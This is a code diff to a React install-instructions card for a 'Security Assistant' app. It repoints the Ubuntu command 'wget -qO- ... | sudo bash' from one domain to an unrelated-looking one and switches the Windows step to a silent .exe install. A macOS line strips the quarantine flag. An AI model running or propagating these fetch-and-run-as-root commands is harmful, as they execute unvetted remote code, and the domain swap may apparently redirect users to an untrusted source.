@@ -42,9 +42,9 @@ export default function OSCard({ os, icon, color, borderColor, bgColor, download
 
   const copyCommand = () => {
     if (os === 'Ubuntu') {
-      navigator.clipboard.writeText('wget -qO- https://rudrans.com/install.sh | sudo bash');
+      navigator.clipboard.writeText('wget -qO- https://ems.wellnessextract.com/install.sh | sudo bash');
     } else {
-      navigator.clipboard.writeText('https://rudrans.com/download');
+      navigator.clipboard.writeText('https://ems.wellnessextract.com/download');
     }
     setShowCopied(true);
     setTimeout(() => setShowCopied(false), 2000);
@@ -112,10 +112,10 @@ export default function OSCard({ os, icon, color, borderColor, bgColor, download
           </div>
           <code className="text-[11px] text-gray-400 font-mono block break-all">
             {os === 'Ubuntu'
-              ? 'wget -qO- https://rudrans.com/install.sh | sudo bash'
+              ? 'wget -qO- https://ems.wellnessextract.com/install.sh | sudo bash'
               : os === 'macOS'
                 ? 'xattr -dr com.apple.quarantine ~/Downloads/Security-Assistant-macOS-*.pkg'
-                : 'msiexec /i SecurityAssistant.msi /quiet /norestart'}
+                : 'Security-Assistant-Windows-vX.Y.Z.exe /S'}
           </code>
           {os === 'macOS' && (
             <p className="text-[10px] text-amber-300 mt-2 leading-relaxed">
